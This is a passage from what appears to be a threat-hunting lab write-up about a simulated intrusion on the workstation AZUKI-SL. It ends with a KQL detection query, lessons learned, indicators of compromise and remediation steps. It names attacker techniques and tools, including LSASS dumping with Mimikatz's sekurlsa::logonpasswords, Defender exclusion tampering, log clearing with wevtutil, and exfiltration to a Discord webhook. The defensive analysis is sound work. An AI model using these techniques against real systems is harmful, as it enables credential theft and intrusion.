| where FileName in ("cmdkey.exe", "mstsc.exe", "cmd.exe", "powershell.exe")
| where ProcessCommandLine contains "/add:"
    or ProcessCommandLine contains "/v:"
    or ProcessCommandLine contains "cmdkey"
    or ProcessCommandLine contains "mstsc"
| extend ExtractedIP = extract(@"\b\d{1,3}(?:\.\d{1,3}){3}\b", 0, ProcessCommandLine)
| project Timestamp, FileName, ProcessCommandLine, ExtractedIP
| order by Timestamp asc
```

## KQL Query Result

<img width="737" height="153" alt="Th2flg19" src="https://github.com/user-attachments/assets/1b02da4b-765f-42b3-9421-53e98365e743" />

<img width="622" height="116" alt="Th2flg120" src="https://github.com/user-attachments/assets/615c4c00-26ae-4332-9bcc-1e49ed2e7b93" />

## Why This Matters

Lateral movement is a critical escalation phase in targeted attacks. Identifying the specific system targeted provides clarity on adversary intent, likely objectives, and the network assets deemed valuable. The use of built-in tools such as `cmdkey` and `mstsc` indicates a “living off the land” approach that evades basic tooling-based detections. This evidence supports prioritizing forensic analysis and containment actions on 10.1.0.188, as it may now contain compromised credentials, malware, or attacker-deployed persistence mechanisms. Using `mstsc.exe` for lateral movement blends malicious activity with normal administrative operations, making it significantly harder for defenders to spot anomalies. Since RDP is widely used for legitimate management tasks, attackers can often evade detection unless telemetry is thoroughly analyzed. Identifying the exact tool and target system clarifies the attacker’s path through the network and informs containment steps such as isolating compromised hosts, invalidating stolen credentials, and reviewing RDP usage policies.

[Back to the Top](#table-of-contents)

## Lessons Learned

### 1. Compromise of Administrative Workstations Has Enterprise-Wide Impact  
The initial breach occurred on **AZUKI-SL**, an administrative workstation with privileged access. Once compromised, the attacker rapidly escalated activity across the environment. This demonstrates that protecting administrative endpoints must be a top priority, as they represent high-value assets with disproportionate risk.

### 2. Lack of Multi-Factor Authentication Enabled Credential Abuse  
The attacker successfully authenticated with stolen credentials (`kenji.sato`) from an external source without triggering MFA challenges. This highlights the critical need for MFA on all privileged and remote access accounts to prevent unauthorized logon events.

### 3. Built-In Windows Utilities Are Commonly Abused for Stealth  
The attacker’s workflow relied entirely on legitimate binaries:
- `powershell.exe` for downloads
- `certutil.exe` for payload delivery
- `schtasks.exe` for persistence
- `curl.exe` for exfiltration
- `net1.exe` for backdoor account creation
- `mstsc.exe` for lateral movement  
This confirms that security programs must emphasize **behavior- and context-based detection**, not simple binary allowlisting.

### 4. Defender Exclusion Abuse Enabled Silent Malware Execution  
By adding exclusions for:
- File extensions
- Temporary directories  
the attacker successfully bypassed Windows Defender scanning. Exclusion tampering must be tightly monitored and restricted.

### 5. Lack of Network Egress Controls Allowed Exfiltration  
Data was exfiltrated over HTTPS to a **Discord webhook**, a common attacker tactic. Without egress filters or firewall rules, this activity blended in with normal HTTPS traffic.

### 6. Insufficient Monitoring of Log Tampering and System Modification  
The attacker used `wevtutil.exe` to clear event logs, destroying critical audit data. This demonstrates the need for:
- Tamper-protection on event logs  
- Forwarding logs centrally to immutable storage  
- Monitoring for log clearing commands

### 7. Credential Theft and Lateral Movement Were Enabled by Weak Isolation  
LSASS dumping and RDP-based lateral movement were possible due to:
- Privileged token access  
- Lack of protected LSASS memory  
- Flat network architecture  
This reinforces the need for segmentation and endpoint hardening.

---

## Indicators of Compromise (IOCs)

### **Initial Access**
- External IP used for authentication: **88.97.178.12**
- Compromised user: **kenji.sato**
- LogonType: **Network / RemoteInteractive**

### **Discovery**
- Network enumeration command: `arp -a`

### **Defense Evasion**
- Hidden staging directory: `C:\ProgramData\WindowsCache`
- Defender exclusions:
  - File extensions: **3 total**
  - Excluded path: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`
- Hidden folder modifications via `attrib +h`
- Windows event logs cleared via `wevtutil.exe`

### **Execution**
- Malicious PowerShell script: `wupdate.ps1`
- Download utilities abused:
  - `powershell.exe`
  - `certutil.exe`

### **Persistence**
- Scheduled task: **Windows Update Check**
- Task target: `C:\ProgramData\WindowsCache\svchost.exe`
- Backdoor account: **support**

### **Credential Access**
- Credential dumping tool: **mm.exe**
- Mimikatz module: `sekurlsa::logonpasswords`

### **Collection / Exfiltration**
- Staging archive: `export-data.zip`
- Exfiltration channel: **Discord**
- C2 IP: **78.141.196.6**
- C2 port: **443**

### **Lateral Movement**
- Target IP: **10.1.0.188**
- Tool used: **mstsc.exe**

---

## Remediation Recommendations

### 1. **Reset All Potentially Compromised Credentials**
- Force password reset for `kenji.sato` and all users with privileged access.
- Immediately disable and remove the attacker-created account `support`.
- Rotate all service accounts and cached credentials on the affected host.

### 2. **Implement and Enforce Multi-Factor Authentication**
- Require MFA for:
  - All remote access  
  - Privileged accounts  
  - VPN/RDP access  

This prevents external unauthorized logins even with valid credentials.

### 3. **Harden Administrative Workstations**
- Restrict administrative login to dedicated Tier-0 workstations.
- Enforce Credential Guard and LSASS protection.
- Enable privilege access workstation (PAW) controls.

### 4. **Enhance Endpoint Security Monitoring**
- Monitor for:
  - `certutil`, `powershell`, `curl`, `schtasks`, and `net1` usage
  - Any Defender exclusion modifications
  - LSASS memory access attempts  
- Enable tamper protection for Windows Defender.

### 5. **Implement Network Segmentation and Egress Filtering**
- Block outbound traffic to:
  - Unknown IPs
  - Personal cloud services (Discord, Dropbox, Mega, etc.)
- Require firewall approval for all non-standard outbound ports.

### 6. **Deploy Centralized Logging With Immutable Storage**
- Forward logs to:
  - SIEM / Cloud logging  
  - Immutable storage (e.g., write-once buckets)  
- Alert on log clearing (`wevtutil.exe`) events.

### 7. **Close Initial Attack Vector and Harden RDP**
- Restrict RDP access to VPN-only.
- Enforce Network Level Authentication (NLA).
- Limit RDP exposure using firewall rules.
- Enable continuous RDP anomaly detection based on:
  - External logon attempts
  - Logon frequency
  - Geographic anomalies

### 8. **Remove All Attacker Artifacts**
- Delete:
  - Staging directory: `C:\ProgramData\WindowsCache`
  - Malicious binaries: `svchost.exe`, `mm.exe`
  - Persistence tasks: "Windows Update Check"
  - Exfiltrated archive(s)
  - Malicious scripts in Temp directories

### 9. **Reimage High-Risk Systems**
If compromise is deep (e.g., persistence, credential theft), reimage:

- AZUKI-SL  
- Any systems laterally accessed (10.1.0.188)

### 10. **Conduct Full Incident Response & Review**
- Document the attack timeline  
- Conduct a credential exposure analysis  
- Review IR and detection gaps  
- Update policies to prevent recurrence

  ## Conclusion

The investigation into the compromise of Azuki’s administrative workstation (AZUKI-SL) revealed a fully developed intrusion chain executed with precision, stealth, and clear operational objectives. Through the systematic analysis of Microsoft Defender for Endpoint telemetry—including logon events, process execution, file system modifications, registry activity, and network connections—we reconstructed the attacker’s workflow from initial access through impact and persistence.

The adversary leveraged legitimate credentials to authenticate via RDP, staged malware in concealed system directories, disabled portions of Windows Defender, automated their workflow with PowerShell scripts, harvested credentials using LSASS memory extraction, and ultimately pivoted laterally toward internal assets. The exfiltration of sensitive business data to a Discord webhook confirmed the business impact and validated concerns about competitive pricing leaks.

Each analytic finding contributed to a holistic understanding of attacker behavior mapped across MITRE ATT&CK phases. The results highlight the importance of layered security: strong authentication controls, vigilant telemetry collection, hardened endpoint configurations, continuous monitoring, and proactive detection engineering.  
This case underscores how a single compromised account on a privileged endpoint can lead to rapid environment-wide risk when persistence, defense evasion, and exfiltration mechanisms are allowed to operate without interruption.

By capturing detailed indicators of compromise, identifying weaknesses exploited during the attack, and documenting actionable remediation steps, this investigation provides a clear path toward strengthening Azuki’s security posture and reducing the likelihood and impact of future intrusions.

[Back to the Top](#table-of-contents)
